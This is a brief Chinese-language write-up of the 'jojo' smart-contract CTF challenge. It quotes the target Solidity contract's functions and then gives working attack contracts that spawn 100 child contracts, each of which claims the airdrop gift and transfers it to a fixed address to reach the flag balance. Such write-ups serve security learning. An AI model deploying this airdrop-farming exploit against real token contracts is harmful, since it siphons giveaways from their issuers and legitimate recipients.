# 数字经济云公测CTF jojo

题目: [https://github.com/beafb1b1/challenges/tree/master/szjj/2019_jojo](https://github.com/beafb1b1/challenges/tree/master/szjj/2019_jojo)

首先我们想要payforflag，需要有10w余额
```js
    function payforflag(string b64email) public {
        require(balanceOf[msg.sender] >= 100000);
        emit SendFlag(b64email);
}
```
程序允许选手想合约转账，转账的以太坊数量就是余额
```js
function jojogame() payable{
        uint geteth=msg.value/1000000000000000000;
        balanceOf[msg.sender]+=geteth;
    }
```
空投函数gift
```js
function gift() public {
        assert(gift[msg.sender]==0);
        balanceOf[msg.sender]+=100;
        gift[msg.sender]=1;
}
```
转账函数
```js
    function transfer(address to,uint value) public{
        assert(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender]-=value;
        balanceOf[to]+=value;
}
````
转战函数无法整形溢出，这里考点就是薅羊毛攻击
通过建立多个自合约领取空投，然后转账给固定账户即可完成攻击payforflag
```js
contract father {
    function createsons(){
        for (uint i=0;i<100;i++)
        {
            son ason=new son();
        }
    }
}

contract son {
    constructor() public{
        jojo tmp = jojo(0xd86ed76112295a07c675974995b9805912282eb3);
        tmp.gift();
        tmp.transfer(0xafFE1Eeea46Ec23a87C7894d90Aa714552468cAF,100);
    }
}
```